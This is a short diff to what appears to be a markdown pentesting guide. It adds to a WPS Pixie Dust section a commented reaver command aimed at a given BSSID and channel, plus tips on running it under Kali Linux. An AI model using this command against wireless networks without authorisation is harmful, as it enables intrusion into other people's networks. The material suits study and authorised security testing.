@@ -79,9 +79,23 @@ We need to save the BSSID and channel of the network that we are going to attack
 
 ## WPS Pixie Dust Attack with reaver
 
-Now that we have our target, the only thing left to do is to start the attack.
+Now that we have our target, the only thing left to do is to start the attack using the following command.
+
+```bash
+# -i : specify wireless interface in monitor mode
+# -b : specify the target bssid 
+# -c : specify the channel of the target AP
+# -K : Pixie Dust Attack mode
+$ sudo reaver -i wlan1 -b "C0:C9:E3:59:11:22" -c 2 -K 
+```
+
+The previous command, if executed successfully should show the next output:
 
 <figure><img src="../../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>
+
+It is highly recommended to execute reaver in Kali Linux because the Kali operative system has all the compatible libraries used by reaver already installed.&#x20;
+
+For example, the same attack doesn't work in my Ubuntu machine and I used the same wireless network interface ([ALFA Network AWUS036AC](https://www.amazon.com/gp/product/B01B33WU82/ref=ppx\_yo\_dt\_b\_asin\_title\_o03\_s00?ie=UTF8\&psc=1)).
 
 ***
 
